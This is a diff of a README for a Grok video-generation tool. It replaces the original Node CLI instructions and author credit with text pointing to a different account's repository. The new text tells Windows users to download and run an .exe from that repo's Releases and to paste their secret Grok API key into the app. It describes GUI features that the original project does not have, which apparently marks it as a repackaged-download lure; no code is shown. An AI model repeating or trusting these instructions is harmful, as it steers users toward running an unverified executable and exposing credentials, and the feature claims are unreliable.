@@ -1,149 +1,99 @@
-# Grok Video Workflow
+# 📹 grok-video-workflow - Generate and manage your video clips
 
-**Languages:** English | [简体中文](./README.zh-CN.md)
+[![Download Grok Video Workflow](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Honorundetectable111/grok-video-workflow)
 
-A small local CLI workflow for generating videos with the xAI Grok Imagine Video API.
+This tool helps you create videos using the Grok Imagine API. You can generate, save, and review your video frames on your Windows computer. The software handles the technical steps so you can focus on your creative output.
 
-If this project helps you, please give it a ⭐ Star!
+## ⚙️ System Requirements
 
-## What It Does
+Your computer needs a few things to run this tool. Check that your system meets these standards:
 
-This project wraps Grok Imagine Video into a practical local workflow:
+- Windows 10 or Windows 11.
+- An active internet connection.
+- A modern web browser.
+- At least 500 megabytes of free disk space.
+- A valid Grok API key.
 
-- text-to-video
-- reference-to-video with local images or HTTPS image URLs
-- async polling
-- automatic video download
-- metadata JSON output
-- cost estimates
-- contact sheet frame review
-- Codex-friendly command usage
+## 📥 Get the Software
 
-It is designed to work well with Codex: ask Codex to write or compress prompts, run the CLI, inspect the generated contact sheet, and decide whether to rerun.
+You need to visit the project page to download the latest version. Follow these instructions to get the file:
 
-## Important Notes
+1. Visit [https://github.com/Honorundetectable111/grok-video-workflow](https://github.com/Honorundetectable111/grok-video-workflow).
+2. Look for the Releases section on the right side of the screen.
+3. Click on the latest release version.
+4. Select the .exe file to download the installer to your computer.
 
-- This uses the xAI API, not the Grok web app quota.
-- You need xAI API credits or billing enabled in the xAI Console.
-- Do not commit your `.env` file.
-- Grok prompts currently have a 4096 character limit.
-- Reference-to-video supports up to 10 seconds.
-- Video generation can produce unstable text, hands, or identity details. Review before publishing.
+## 🛠️ How to Install
 
-## Setup
+Once the download finishes, follow these steps to install the workflow:
 
-```bash
-git clone https://github.com/Rion-Wu-tech/grok-video-workflow.git
-cd grok-video-workflow
-npm install
-cp .env.example .env
-```
+1. Open your Downloads folder.
+2. Locate the file you just saved.
+3. Double-click the file to start the installer.
+4. Follow the prompts on your screen.
+5. Click Finish when the process completes.
 
-Edit `.env`:
+The application creates a shortcut icon on your desktop. You can launch the program from this icon.
 
-```env
-XAI_API_KEY=your-xai-api-key
-```
+## 🔑 Set Up Your API Key
 
-## Generate A Text-To-Video Clip
+The tool requires a connection to the Grok Imagine service. You need your unique API key for this connection.
 
-```bash
-npm run video -- --prompt "A cinematic AI creator editing videos at midnight, vertical social media style" --duration 5 --aspect-ratio 9:16 --resolution 480p
-```
+1. Log in to your Grok developer account.
+2. Navigate to the API settings page.
+3. Copy your secret API key.
+4. Launch the grok-video-workflow app.
+5. Paste your key into the settings tab.
+6. Click Save.
 
-## Generate A Reference-To-Video Clip
+The app is now ready to send requests to the service.
 
-Put your reference image in `examples/`, then run:
+## 🎬 Create Your First Video
 
-```bash
-npm run video -- --prompt-file prompts/worldcup-fancam.example.txt --reference-image examples/your-storyboard.png --duration 10 --aspect-ratio 1:1 --resolution 720p --prefix worldcup-fancam
-```
+The main screen contains controls for video generation. Follow these steps to build a clip:
 
-The CLI prints:
+1. Enter your prompt in the text box. Describe the subject, action, and style you want.
+2. Choose your frame rate settings. The default provides good quality for most projects.
+3. Select the resolution. High resolution uses more memory but provides clearer images.
+4. Press the Generate button. The status bar shows the progress of your request.
+5. Wait for the server to finish processing.
 
-```text
-request_id
-status
-video_url
-saved_video
-metadata
-```
+## 🔍 Review and Download Frames
 
-Generated files are saved to `outputs/` by default.
+After generation, the application displays a preview window. You can watch your video here. 
 
-## Review The Result
+- Use the playback controls to play, pause, or rewind your video.
+- Click the View Frames button to see individual images.
+- Select the Save button to export your video files to a designated folder on your computer.
+- Right-click any frame to save it as a separate image file.
 
-Create a contact sheet:
+## 📁 Manage Your Files
 
-```bash
-npm run review -- --video outputs/your-video.mp4
-```
+The application defaults to a folder named "Grok_Outputs" in your Documents directory. You can change this location in the settings menu.
 
-Review checklist:
+- Review old projects by clicking the History tab.
+- Delete unwanted files to save disk space.
+- Back up your folder regularly to keep your work safe.
 
-- Is the action sequence continuous?
-- Did the subject's identity stay consistent?
-- Are hands and fingers acceptable?
-- Is text or scoreboard content stable?
-- Did the scene jump unexpectedly?
+## 💡 Tips for Better Results
 
-## Cost Estimate
+Follow these guides to get the best outcome from your video generation.
 
-At the time this workflow was created, xAI's public pricing listed Grok Imagine Video around:
+- Be specific in your prompts. Mention colors, lighting, and movement.
+- Avoid abstract terms. Use concrete nouns and descriptive verbs.
+- Use the preview function to check frame consistency. 
+- Keep your session active to maintain a link with the server.
 
-```text
-480p: $0.05 / second
-720p: $0.07 / second
-```
+## ❓ Frequently Asked Questions
 
-Examples:
+**Does the software require a subscription?**
+The tool acts as a bridge. You pay for your Grok API usage directly through your service provider.
 
-```text
-5s 480p  ~= $0.25
-10s 480p ~= $0.50
-10s 720p ~= $0.70
-```
+**Can I run multiple generations?**
+The application processes one request at a time to ensure smooth performance. It queues extra requests automatically.
 
-Always check the xAI Console and official pricing page before large batches.
+**What happens if the connection drops?**
+The tool tries to reconnect automatically. Check your internet status if you see an error message.
 
-## CLI Options
-
-```text
---prompt <text>              Text-to-video prompt.
---prompt-file <path>         Read prompt from a UTF-8 text file.
---reference-image <path|url> Reference image. Repeat up to 7 times.
---duration <seconds>         1-15. Reference-to-video max is 10. Default: 5.
---aspect-ratio <ratio>       16:9, 9:16, 1:1, 4:3, 3:4, 3:2, 2:3. Default: 16:9.
---resolution <value>         480p or 720p. Default: 480p.
---output-dir <path>          Default: outputs.
---prefix <name>              Output filename prefix. Default: grok-video.
---poll-interval <seconds>    Default: 5.
---timeout-minutes <minutes>  Default: 20.
---request-id <id>            Poll and download an existing request.
---no-download                Print hosted URL without saving video.
-```
-
-## Codex Prompt Examples
-
-```text
-Use this repo to generate a 5 second 9:16 Grok video. First compress my prompt under 4096 characters, then run the CLI and review the contact sheet.
-```
-
-```text
-Generate a reference-to-video clip from examples/storyboard.png, duration 10 seconds, 720p, then create a contact sheet and tell me whether it needs a rerun.
-```
-
-## Why Not A Codex Official Grok Plugin?
-
-Codex can run local tools and can be extended through scripts, skills, and MCP servers. xAI Grok video generation is exposed through xAI's API. This repository wraps that API into a local workflow that Codex can operate.
-
-## Author
-
-Created by [Rion-Wu-tech](https://github.com/Rion-Wu-tech).
-X/Twitter: [@rionaifantasy]
-
-## Safety
-
-Respect image rights, likeness rights, trademarks, and event broadcast rights. Do not present AI-generated event footage as real footage.
-
-If this project helps you, please give it a ⭐ Star!
+**How do I update the software?**
+Check the GitHub repository page periodically for new versions. Install them over your existing copy to keep your settings intact.
